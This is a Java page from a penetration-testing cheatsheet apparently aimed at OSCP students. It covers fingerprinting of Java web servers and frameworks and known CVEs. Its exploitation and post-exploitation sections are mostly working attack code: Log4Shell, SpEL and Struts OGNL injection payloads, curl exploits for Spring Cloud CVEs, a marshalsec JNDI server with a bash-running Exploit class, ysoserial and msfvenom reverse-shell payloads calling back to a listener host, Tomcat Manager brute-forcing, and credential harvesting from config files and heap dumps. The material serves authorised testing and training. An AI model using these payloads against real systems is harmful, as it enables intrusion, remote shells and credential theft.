# Java

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `Set-Cookie: JSESSIONID=...` | Java Servlet / Spring / Tomcat |
| `Server: Apache-Coyote/1.1` | Tomcat |
| `Server: Jetty` | Jetty |
| `Server: JBoss` | JBoss / WildFly |
| `Server: WebSphere` | IBM WebSphere |
| `X-Powered-By: Servlet` | Generic servlet |
| `X-Application-Context: application` | Spring Boot |
| `Set-Cookie: JSESSIONID` + `WWW-Authenticate: Basic realm="Tomcat"` | Tomcat Manager |

### 1.2 Error messages

| Error text | Framework |
|------------|-----------|
| `org.apache.catalina` | Tomcat |
| `java.lang.NullPointerException` | Any Java |
| `org.springframework` | Spring |
| `javax.servlet.ServletException` | Servlet API |
| `com.sun.faces` | JSF |
| `Whitelabel Error Page` | Spring Boot |
| `Struts Problem Report` | Apache Struts |

### 1.3 URL patterns

| Pattern | Indicates |
|---------|-----------|
| `.jsp`, `.jspx`, `.do`, `.action` | Java web app |
| `/actuator` | Spring Boot Actuator |
| `/manager/html` | Tomcat Manager |
| `/host-manager/html` | Tomcat Host Manager |
| `/jmx-console` | JBoss JMX |
| `/web-console` | JBoss Web Console |
| `/admin-console` | JBoss Admin |

---

## 2. Enumeration

### 2.1 Common files and endpoints

| Path | Purpose |
|------|---------|
| `/manager/html` | Tomcat Manager (auth required, often weak) |
| `/actuator` | Spring Boot Actuator (health, info, env, mappings) |
| `/actuator/env` | Environment properties (creds, secrets) |
| `/actuator/heapdump` | Heap dump (memory - creds, sessions) |
| `/actuator/mappings` | All HTTP endpoints |
| `/actuator/beans` | Spring beans |
| `/WEB-INF/web.xml` | Servlet config (if exposed) |
| `/META-INF/MANIFEST.MF` | Build info |

### 2.2 Version fingerprinting

```bash
# Tomcat version
curl -s http://<TARGET>:8080/docs/ | grep -i "Apache Tomcat"
curl -sI http://<TARGET>:8080/ | grep -i server

# Spring Boot
curl -s http://<TARGET>/actuator/info
curl -s http://<TARGET>/actuator/health
```

### 2.3 Tomcat Manager brute force

```bash
# Default creds to try
# tomcat:tomcat, admin:admin, manager:manager, role1:role1, both:both

# Metasploit
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <TARGET>; set RPORT 8080; run"

# Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <TARGET> -s 8080 http-get /manager/html
```

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2017-5638 | Struts 2.3.5-2.3.31, 2.5-2.5.10 | RCE via Content-Type OGNL | https://nvd.nist.gov/vuln/detail/CVE-2017-5638 |
| CVE-2018-11776 | Struts 2.3-2.3.34, 2.5-2.5.16 | RCE via namespace | https://nvd.nist.gov/vuln/detail/CVE-2018-11776 |
| CVE-2020-1938 | Tomcat < 9.0.31 (Ghostcat) | File read + potential RCE | https://nvd.nist.gov/vuln/detail/CVE-2020-1938 |
| CVE-2020-9484 | Tomcat <= 9.0.34 | Deserialization RCE via session persistence | https://nvd.nist.gov/vuln/detail/CVE-2020-9484 |
| CVE-2022-22965 | Spring Framework < 5.3.18 / 5.2.20 (Spring4Shell) | RCE via data binding | https://nvd.nist.gov/vuln/detail/CVE-2022-22965 |
| CVE-2022-22947 | Spring Cloud Gateway < 3.1.0 | SpEL RCE | https://nvd.nist.gov/vuln/detail/CVE-2022-22947 |
| CVE-2022-22963 | Spring Cloud Function <= 3.2.2 | SpEL RCE via routing expression | https://nvd.nist.gov/vuln/detail/CVE-2022-22963 |
| CVE-2021-44228 | Log4j 2.0-beta9 to 2.14.1 (Log4Shell) | JNDI RCE | https://nvd.nist.gov/vuln/detail/CVE-2021-44228 |
| CVE-2021-45046 | Log4j 2.0-2.15.0 | DoS / RCE via crafted pattern | https://nvd.nist.gov/vuln/detail/CVE-2021-45046 |

---

## 4. Exploitation patterns

### 4.1 Deserialization (Java serialized objects)

Java serialized objects start with bytes `AC ED 00 05` (hex) or `rO0AB` (base64).

**Detection:**

```bash
# Look for rO0AB in cookies, params, body
echo "<base64>" | base64 -d | xxd | head -1
# Should show: aced 0005
```

**Tools:**

- **ysoserial** - generates payloads for common gadget chains (CommonsCollections, Spring, Groovy, etc.)
- **ysoserial.net** - .NET equivalent (different tool, similar concept)

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,BASE64_REV_SHELL}|{base64,-d}|bash' > payload.bin

# URL-encode and send
cat payload.bin | base64 -w0
```

Common gadget chains: CommonsCollections1-7, Spring1-2, Groovy1, Hibernate1-2, JRMPClient.

### 4.2 SpEL injection (Spring)

Spring Expression Language (SpEL) allows expression evaluation in various contexts.

**Payloads:**

```text
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
%{7*7}
```

**Spring Cloud Function (CVE-2022-22963):**

```bash
curl -X POST http://<TARGET>/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
  -d "test"
```

**Spring Cloud Gateway (CVE-2022-22947):**

```bash
# Add route with SpEL
curl -X POST http://<TARGET>/actuator/gateway/routes/hack \
  -H "Content-Type: application/json" \
  -d '{"id":"hack","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}"}}],"uri":"http://example.com","order":0}'
# Trigger refresh + access
```

### 4.3 Log4Shell (CVE-2021-44228)

Any user input logged by Log4j2 triggers JNDI lookup.

**Payloads:**

```text
${jndi:ldap://<LHOST>/exploit}
${jndi:ldap://<LHOST>:1389/a}
${${lower:j}ndi:${lower:l}dap://<LHOST>/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<LHOST>/a}
```

**JNDI exploit server:**

```bash
# Start LDAP server (marshalsec + HTTP server)
git clone https://github.com/mbechler/marshalsec
cd marshalsec && mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:8000/#Exploit" 1389

# In another terminal
echo 'public class Exploit { static { try { Runtime.getRuntime().exec("bash -c {echo,...}|{base64,-d}|bash"); } catch (Exception e) {} } }' > Exploit.java
javac Exploit.java
python3 -m http.server 8000
```

### 4.4 OGNL injection (Struts 2)

**CVE-2017-5638 (Content-Type):**

```bash
curl -X POST http://<TARGET>/ \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -d "test"
```

### 4.5 Ghostcat (CVE-2020-1938)

Tomcat AJP protocol (port 8009) file read + potential RCE.

```bash
# Exploit
python3 ghostcat.py -p 8009 <TARGET> /WEB-INF/web.xml
# Or Metasploit
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <TARGET>; run"
```

### 4.6 Tomcat Manager WAR upload

If you have Manager access:

```bash
# Generate WAR with JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# Upload via Manager
curl -u user:pass -T shell.war "http://<TARGET>:8080/manager/text/deploy?path=/shell"

# Trigger
curl http://<TARGET>:8080/shell/
```

---

## 5. Framework-specific

### 5.1 Spring Boot

- `/actuator` - endpoints (env, health, info, mappings, heapdump)
- `/actuator/env` - properties (creds, secrets)
- `/actuator/heapdump` - heap dump (use `MAT` or `jvisualvm` to analyze)
- `/actuator/shutdown` - POST to shutdown (if enabled)
- Whitelabel Error Page - default Spring Boot 404

### 5.2 Apache Struts

- `/struts` - action mappings
- `.action`, `.do` - typical extensions
- OGNL injection in parameters, headers, Content-Type

### 5.3 Apache Tomcat

- `/manager/html` - Manager
- `/host-manager/html` - Host Manager
- `/docs` - documentation (version fingerprint)
- `/examples` - example apps (often vulnerable)
- `/WEB-INF/` - protected (Ghostcat bypass)

### 5.4 JBoss / WildFly

- `/jmx-console` - JMX console (legacy)
- `/web-console` - Web console (legacy)
- `/admin-console` - Admin (legacy)
- CVE-2017-12149 - deserialization in `/invoker/readonly`

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/application.yml
/META-INF/MANIFEST.MF
/opt/tomcat/conf/tomcat-users.xml
```

### 6.2 Tomcat credentials

```bash
cat /opt/tomcat/conf/tomcat-users.xml
# Contains: <user username="..." password="..." roles="manager-gui,admin-gui"/>
```

### 6.3 Spring Boot heapdump analysis

```bash
# Download
curl http://<TARGET>/actuator/heapdump -o heapdump.hprof

# Analyze with Eclipse MAT or jhat
jhat heapdump.hprof
# Browse http://localhost:7000, search for "password"
```

Or use `JDumpSpider`:

```bash
java -jar JDumpSpider.jar heapdump.hprof
```

### 6.4 Java reverse shell

```bash
# msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp
```

Upload to web-accessible directory and access via browser.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (JSESSIONID, Server header) that identifies Java.

> [!IMPORTANT]
> OSCP report: screenshot the exploit payload (deserialization, SpEL, Log4Shell) and its result.

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (reverse shell, webshell response).

---

## 8. References

- Java official docs: https://docs.oracle.com/en/java/
- HackTricks - Java: https://book.hacktricks.xyz/pentesting-web/deserialization
- ysoserial: https://github.com/frohoff/ysoserial
- marshalsec: https://github.com/mbechler/marshalsec
- PayloadsAllTheThings - Java: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java%20Deserialization
- CVE-2017-5638: https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- CVE-2018-11776: https://nvd.nist.gov/vuln/detail/CVE-2018-11776
- CVE-2020-1938: https://nvd.nist.gov/vuln/detail/CVE-2020-1938
- CVE-2020-9484: https://nvd.nist.gov/vuln/detail/CVE-2020-9484
- CVE-2022-22965: https://nvd.nist.gov/vuln/detail/CVE-2022-22965
- CVE-2022-22947: https://nvd.nist.gov/vuln/detail/CVE-2022-22947
- CVE-2022-22963: https://nvd.nist.gov/vuln/detail/CVE-2022-22963
- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CVE-2021-45046: https://nvd.nist.gov/vuln/detail/CVE-2021-45046

---